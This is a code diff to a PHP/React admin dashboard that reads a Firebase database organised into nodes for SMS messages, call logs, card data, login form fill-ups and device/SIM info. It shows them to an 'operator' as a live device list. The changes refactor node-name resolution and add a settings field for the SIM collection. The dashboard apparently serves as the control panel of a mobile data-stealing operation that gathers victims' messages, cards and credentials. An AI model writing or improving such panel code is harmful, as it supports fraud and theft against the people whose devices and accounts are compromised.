@@ -312,20 +312,14 @@ include_once __DIR__ . '/header.php';
 
         const fetchFirebaseRealtimeData = async () => {
           try {
-            // Determine active Firebase DB REST URL — use operator's own saved database URL
-            const activePreset = allFbPresets[fbPresetKey] || DEFAULT_SCHEMA_PRESETS.pm_admin;
-            const resolvedPreset = (fbPresetKey === 'custom') ? {
-              sms: fbSmsColl,
-              calls: fbCallsColl,
-              cards: fbCardsColl,
-              forms: fbFormsColl,
-              sims: fbSimsColl
-            } : {
-              sms: adminUser?.collectionSms || activePreset.sms,
-              calls: adminUser?.collectionCalls || activePreset.calls,
-              cards: adminUser?.collectionCards || activePreset.cards,
-              forms: adminUser?.collectionForms || activePreset.forms,
-              sims: adminUser?.collectionSims || activePreset.sims || 'user_data'
+            // Always resolve node names from the live UI state variables.
+            // These are set on login (from MySQL) and updated when the operator changes settings.
+            const resolvedPreset = {
+              sms:   fbSmsColl   || 'user_sms',
+              calls: fbCallsColl || 'calls',
+              cards: fbCardsColl || 'Card',
+              forms: fbFormsColl || 'login',
+              sims:  fbSimsColl  || 'user_data'
             };
 
             let rawUrl = fbDatabaseUrl.trim() ||
@@ -350,11 +344,11 @@ include_once __DIR__ . '/header.php';
 
             if (!dbData || typeof dbData !== 'object' || !isMounted) return;
 
-            // Extract Node Mappings
-            const user_data_node = dbData[resolvedPreset.sims || 'user_data'] || dbData.user_data || {};
-            const user_sms_node = dbData[resolvedPreset.sms || 'user_sms'] || dbData.user_sms || {};
-            const card_node = dbData[resolvedPreset.cards || 'Card'] || dbData.Card || {};
-            const login_node = dbData[resolvedPreset.forms || 'login'] || dbData.login || {};
+            // Extract Node Mappings using resolved preset
+            const user_data_node = dbData[resolvedPreset.sims]  || dbData.user_data || {};
+            const user_sms_node  = dbData[resolvedPreset.sms]   || dbData.user_sms  || {};
+            const card_node      = dbData[resolvedPreset.cards]  || dbData.Card      || {};
+            const login_node   = dbData[resolvedPreset.forms] || dbData.login || {};
             const account_node = dbData.account || {};
 
             // Build Live User Devices List
@@ -628,7 +622,7 @@ include_once __DIR__ . '/header.php';
               collectionCalls: fbCallsColl.trim(),
               collectionCards: fbCardsColl.trim(),
               collectionForms: fbFormsColl.trim(),
-              collectionSims: 'user_data'
+              collectionSims: fbSimsColl.trim()
             })
           });
           const data = await res.json();
@@ -654,6 +648,7 @@ include_once __DIR__ . '/header.php';
           collectionCalls: fbCallsColl.trim(),
           collectionCards: fbCardsColl.trim(),
           collectionForms: fbFormsColl.trim(),
+          collectionSims: fbSimsColl.trim(),
           firebaseConfig: updatedConfig
         }));
 
@@ -1601,6 +1596,10 @@ include_once __DIR__ . '/header.php';
                           <div>
                             <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Form Fill-ups Collection</label>
                             <input type="text" className="search-input" value={fbFormsColl} onChange={(e) => { setFbFormsColl(e.target.value); setFbPresetKey('custom'); }} placeholder="formData (or userInputs)" />
+                          </div>
+                          <div>
+                            <label style={{ fontSize: '0.75rem', color: '#9ca3af', display: 'block', marginBottom: '2px' }}>Device / SIM Info Collection</label>
+                            <input type="text" className="search-input" value={fbSimsColl} onChange={(e) => { setFbSimsColl(e.target.value); setFbPresetKey('custom'); }} placeholder="user_data (or clients)" />
                           </div>
                         </div>
                       </div>
